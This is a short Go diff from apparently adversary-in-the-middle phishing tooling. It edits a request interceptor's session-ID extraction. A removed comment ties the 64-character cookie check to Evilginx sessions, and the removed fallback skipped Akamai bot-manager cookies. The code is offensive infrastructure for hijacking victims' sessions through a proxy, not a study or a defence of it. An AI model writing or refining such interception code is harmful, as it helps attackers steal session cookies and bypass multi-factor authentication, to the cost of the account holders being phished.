@@ -335,20 +335,9 @@ func (ri *RequestInterceptor) replaceTokenInRequest(req *http.Request, oldToken,
 
 // ExtractSessionID extracts session ID from request/cookies
 func (ri *RequestInterceptor) ExtractSessionID(req *http.Request) string {
-	// Try to get session ID from cookie
+	// 1. Try to get session ID from cookie (64-character hex only)
 	for _, cookie := range req.Cookies() {
-		// Evilginx session IDs are usually hex strings of 64 characters
 		if len(cookie.Value) == 64 {
-			return cookie.Value
-		}
-	}
-
-	// Fallback to any cookie that looks like a potential session ID (long string, not Akamai)
-	for _, cookie := range req.Cookies() {
-		if strings.HasPrefix(cookie.Name, "_abck") || strings.HasPrefix(cookie.Name, "bm_sz") {
-			continue
-		}
-		if len(cookie.Value) > 16 && !strings.Contains(cookie.Value, "-") {
 			return cookie.Value
 		}
 	}
